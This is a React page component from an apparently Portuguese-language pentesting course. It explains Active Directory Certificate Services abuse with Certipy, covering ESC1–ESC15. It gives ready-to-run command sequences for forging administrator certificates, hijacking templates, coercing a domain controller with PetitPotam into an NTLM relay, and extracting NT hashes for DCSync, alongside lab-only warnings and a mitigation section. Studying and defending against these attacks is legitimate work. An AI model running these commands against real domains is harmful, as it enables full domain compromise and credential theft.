import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function ADCS() {
  return (
    <PageContainer
      title="ADCS / Certipy — abusando de certificados no Active Directory"
      subtitle="Enumeração com Certipy e as escaladas ESC1–ESC13 até comprometer o domínio"
      difficulty="avancado"
      timeToRead="28 min"
    >
      <h2>O que é ADCS e por que importa</h2>
      <p>
        O <strong>Active Directory Certificate Services</strong> é a PKI da
        Microsoft dentro do domínio. Emite certificados que podem ser usados
        para <strong>autenticar</strong> (via Kerberos PKINIT / Schannel). O
        problema: um certificado de cliente válido é tão bom quanto a senha —
        e configurações fracas deixam um usuário comum <strong>pedir um
        certificado se passando por Domain Admin</strong>.
      </p>
      <AlertBox type="danger" title="Impacto">
        Um único template mal configurado costuma virar
        <strong> comprometimento total do domínio</strong> a partir de uma conta
        sem privilégio. As falhas foram catalogadas como <strong>ESC1 a ESC13</strong>
        pela SpecterOps e são das rotas mais exploradas hoje.
      </AlertBox>
      <AlertBox type="warning" title="Só no seu lab / com autorização">
        Tudo aqui derruba um domínio real. Pratique no seu AD de laboratório
        (veja “Monte seu laboratório”) ou em engajamento contratado.
      </AlertBox>

      <h2>1. Certipy — a ferramenta</h2>
      <p>
        O <strong>Certipy</strong> enumera e explora ADCS de ponta a ponta:
        acha templates vulneráveis, pede certificados, faz relay e autentica.
      </p>
      <CommandTable
        title="Setup"
        variations={[
          { cmd: "pipx install certipy-ad", desc: "Instalação isolada (recomendado)" },
          { cmd: "certipy find -u user@dominio.local -p 'Senha' -dc-ip 10.0.0.1 -stdout", desc: "Enumera CAs e templates com análise de vulnerabilidade" },
          { cmd: "certipy find ... -vulnerable -stdout", desc: "Só mostra o que é explorável (ESCx)" },
          { cmd: "certipy find ... -bloodhound", desc: "Exporta para o BloodHound analisar caminhos" },
        ]}
      />
      <Terminal
        path="~"
        lines={[
          { comment: "enumeracao inicial", cmd: "certipy find -u joao@corp.local -p 'P@ss' -dc-ip 10.0.0.10 -vulnerable -stdout", out: "Certificate Templates\n  0\n    Template Name  : UserAuth\n    [!] Vulnerabilities\n      ESC1 : Enrollee supplies subject and client auth EKU", outType: "warning" },
        ]}
      />

      <h2>2. O mapa das ESCs</h2>
      <OutputBlock type="info" label="Onde mora cada falha">
        <p><strong>Templates de certificado</strong>: ESC1, ESC2, ESC3, ESC4, ESC9, ESC10, ESC13, ESC15</p>
        <p><strong>Configuração da CA</strong>: ESC6, ESC7, ESC11</p>
        <p><strong>Endpoints de inscrição (relay NTLM)</strong>: ESC8, ESC11</p>
        <p><strong>Acesso ao objeto da CA/domínio</strong>: ESC5</p>
      </OutputBlock>

      <h2>3. ESC1 — o clássico: SAN arbitrário</h2>
      <p>
        Template que permite <em>o solicitante informar o Subject Alternative
        Name</em> (<code>ENROLLEE_SUPPLIES_SUBJECT</code>), tem EKU de
        autenticação de cliente e deixa usuários comuns se inscreverem. Você
        pede um certificado dizendo “eu sou o Administrator”.
      </p>
      <PracticeBox
        title="ESC1 → Domain Admin"
        goal="Emitir um cert se passando pelo administrador e autenticar"
        command={`# 1. pede o cert com SAN de admin
certipy req -u joao@corp.local -p 'P@ss' -dc-ip 10.0.0.10 \\
  -ca CORP-CA -template UserAuth -upn administrator@corp.local
# gera administrator.pfx

# 2. autentica com o cert e pega o TGT + hash NT
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10`}
        expected="[*] Got TGT e [*] Got NT hash for 'administrator@corp.local'"
        verify="Use o hash com secretsdump/wmiexec para provar o DA"
      />

      <h2>4. ESC2, ESC3, ESC15 — EKUs perigosos</h2>
      <OutputBlock type="muted" label="Variações de template">
        <p><strong>ESC2</strong> — template com EKU <em>Any Purpose</em> (ou nenhum): o cert serve para qualquer coisa, inclusive autenticação.</p>
        <p><strong>ESC3</strong> — template de <em>Enrollment Agent</em>: você emite um cert que permite pedir certificados <em>em nome de outros usuários</em>.</p>
        <p><strong>ESC15 (CVE-2024-49019)</strong> — templates v1 com “Enrollee supplies subject” permitem injetar EKU de aplicação via schema v1; abuso parecido com ESC1.</p>
      </OutputBlock>
      <CodeBlock
        language="bash"
        code={`# ESC3: emite o enrollment agent e usa -on-behalf-of
certipy req -u joao@corp.local -p 'P@ss' -ca CORP-CA -template EnrollmentAgent
certipy req -u joao@corp.local -p 'P@ss' -ca CORP-CA -template User \\
  -on-behalf-of 'CORP\\administrator' -pfx enrollmentagent.pfx`}
      />

      <h2>5. ESC4 — controle sobre o template</h2>
      <p>
        Se você tem permissão de escrita (WriteDacl/WriteOwner/FullControl) no
        objeto do template, <strong>reconfigure-o para ficar vulnerável a
        ESC1</strong>, explore e depois restaure.
      </p>
      <PracticeBox
        title="ESC4: tornar vulnerável, explorar, restaurar"
        goal="Abusar de ACL fraca no template"
        command={`# reconfigura o template para ESC1
certipy template -u joao@corp.local -p 'P@ss' -template VulnTemplate -save-old
# ...explora como ESC1...
# restaura a config original salva
certipy template -u joao@corp.local -p 'P@ss' -template VulnTemplate -configuration VulnTemplate.json`}
        expected="Template alterado, cert de admin emitido, config restaurada"
        verify="certipy find confirma o template de volta ao estado seguro"
      />

      <h2>6. ESC6, ESC7, ESC11 — na configuração da CA</h2>
      <OutputBlock type="muted" label="Falhas do lado do servidor de CA">
        <p><strong>ESC6</strong> — flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> na CA: qualquer template vira ESC1, pois a CA aceita SAN do solicitante.</p>
        <p><strong>ESC7</strong> — você tem <em>ManageCA / ManageCertificates</em>: pode aprovar requests pendentes, ligar a flag do ESC6 ou emitir para si.</p>
        <p><strong>ESC11</strong> — interface <em>ICertPassage (ICPR)</em> sem exigir assinatura de pacote: alvo de NTLM relay igual ao ESC8, mas via RPC.</p>
      </OutputBlock>
      <CodeBlock
        language="bash"
        code={`# ESC7: abusando de ManageCA para habilitar ESC6 e emitir
certipy ca -u joao@corp.local -p 'P@ss' -ca CORP-CA -enable-template SubCA
certipy ca -u joao@corp.local -p 'P@ss' -ca CORP-CA -issue-request 42`}
      />

      <h2>7. ESC8 / ESC11 — NTLM relay para inscrição</h2>
      <p>
        A CA expõe um <strong>endpoint web (HTTP) de inscrição</strong> que
        aceita autenticação NTLM. Você coage uma máquina (ex.: o próprio DC via
        PetitPotam/Coercer) a autenticar e <strong>faz relay dessa
        autenticação</strong> para pedir um cert em nome dela.
      </p>
      <PracticeBox
        title="ESC8: relay do DC$ para virar domínio"
        goal="Certificado de máquina do DC via coerção + relay"
        command={`# terminal 1: relay do Certipy para o endpoint web da CA
certipy relay -target 'http://CA.corp.local/certsrv/certfnsh.asp' -template DomainController

# terminal 2: coage o DC a autenticar no seu host
python3 PetitPotam.py -u joao -p 'P@ss' -d corp.local <SEU_IP> <IP_DC>
# o relay captura e emite dc.pfx; depois:
certipy auth -pfx dc.pfx -dc-ip 10.0.0.10`}
        expected="Cert do DC$ emitido; TGT do controlador de domínio → DCSync"
        verify="Com o TGT do DC$, rode secretsdump para dumpar o krbtgt"
      />
      <AlertBox type="info" title="Coerção de autenticação">
        Ferramentas: <code>PetitPotam</code>, <code>Coercer</code>,
        <code>PrinterBug</code>. O relay costuma ser feito com
        <code>ntlmrelayx</code> ou pelo próprio <code>certipy relay</code>.
      </AlertBox>

      <h2>8. ESC9, ESC10, ESC13 — mapeamento de identidade</h2>
      <OutputBlock type="muted" label="Abusos de como o cert vira identidade">
        <p><strong>ESC9</strong> — template com <code>CT_FLAG_NO_SECURITY_EXTENSION</code>: sem a extensão de SID, o cert pode ser mapeado para outra conta (combina com shadow credentials / troca de UPN).</p>
        <p><strong>ESC10</strong> — mapeamento fraco de certificados na chave de registro do DC (weak/permissive mapping), permitindo se passar por outro principal.</p>
        <p><strong>ESC13</strong> — template com <em>issuance policy</em> vinculada a um grupo do AD: emitir o cert concede, na prática, a associação àquele grupo privilegiado.</p>
      </OutputBlock>

      <h2>9. Pass-the-Certificate</h2>
      <p>
        Depois de obter um <code>.pfx</code>, o <code>certipy auth</code> troca
        o certificado por um <strong>TGT</strong> (via PKINIT) e recupera o
        <strong>hash NT</strong> da conta (via UnPAC-the-hash). Daí você segue
        para DCSync, movimento lateral, etc.
      </p>
      <Terminal
        path="~"
        lines={[
          { comment: "cert -> TGT -> hash", cmd: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10", out: "[*] Got TGT\n[*] Saved credential cache to 'administrator.ccache'\n[*] Got hash for 'administrator@corp.local': aad3b...:31d6c...", outType: "success" },
        ]}
      />

      <h2>Defesa</h2>
      <OutputBlock type="success" label="Fechando o ADCS">
        <p><strong>Remova ENROLLEE_SUPPLIES_SUBJECT</strong> de templates com EKU de autenticação (mata ESC1).</p>
        <p><strong>Desligue EDITF_ATTRIBUTESUBJECTALTNAME2</strong> na CA (mata ESC6).</p>
        <p><strong>Exija aprovação do gerente</strong> e restrinja quem se inscreve; revise ACLs de templates e da CA (ESC2–ESC5, ESC7).</p>
        <p><strong>Desabilite HTTP e habilite EPA/assinatura</strong> nos endpoints de inscrição (ESC8/ESC11).</p>
        <p><strong>Aplique o patch de mapeamento forte</strong> (KB5014754, extensão de SID) para ESC9/ESC10.</p>
        <p><strong>Monitore</strong> eventos 4886/4887 da CA e emissões com SAN inesperado.</p>
      </OutputBlock>
      <AlertBox type="info" title="Auditoria rápida">
        <code>certipy find -vulnerable</code> como usuário comum já mostra o que
        um atacante veria. Rode periodicamente do lado defensivo.
      </AlertBox>
    </PageContainer>
  );
}
